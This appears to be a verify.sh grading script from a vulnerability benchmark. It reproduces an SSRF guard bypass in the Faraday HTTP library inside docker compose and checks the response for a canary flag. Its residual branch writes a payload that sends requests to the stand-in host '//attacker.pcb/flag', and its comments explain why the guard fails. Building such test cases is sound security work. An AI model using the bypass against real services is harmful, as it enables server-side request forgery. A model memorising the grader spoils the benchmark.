#!/usr/bin/env bash
# verify.sh (auto-adapted for PCBV2-0107, executor, flag_channel=body)
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
if [[ "$MODE" == "--seed" ]]; then
  # seed（既有行为，已通）：original_poc.py -> cand.json
  "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
  # flag placeholder replace (file-based)
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
  # wrap non-JSON candidate into multi-field dict (file-based)
  "$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2
else
  # residual: CVE-2026-33637 / GHSA-5rv5-xj5j-3484（_heldout/bypass_poc.py 语义内嵌字面量，不引用 hidden 文件）。
  # V1(2.14.1) 的 CVE-2026-25765 修复只在 guard 上加 `|| url.start_with?('//')`，而该 guard 本身
  # 以 `url.respond_to?(:start_with?)` 为前提：URI 对象不响应 start_with? -> guard 整体跳过，
  # URI#merge 仍取 `//attacker.pcb` 覆盖固定 base host -> 到达 attacker.pcb 取回 ${PCB_FLAG}。
  # mode=uri（应用先把输入 parse 成 URI 对象再交给 Faraday）。V2(2.14.2) 先 to_s 再 guard -> 阻断。
  # 效果通道 = /fetch 响应 body 中的 flag；判定用 RUN_FLAG（canary 类）。
  CAND='{"to": "//attacker.pcb/flag", "mode": "uri", "probe_id": "residual-cve-2026-33637-protocol-relative-uri-object"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
fi
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('body') or d.get('fetched_body') or d.get('resp') or d.get('response') or d.get('location') or '')
sys.exit(0 if '$RUN_FLAG' in body else 10)" "$OUT"
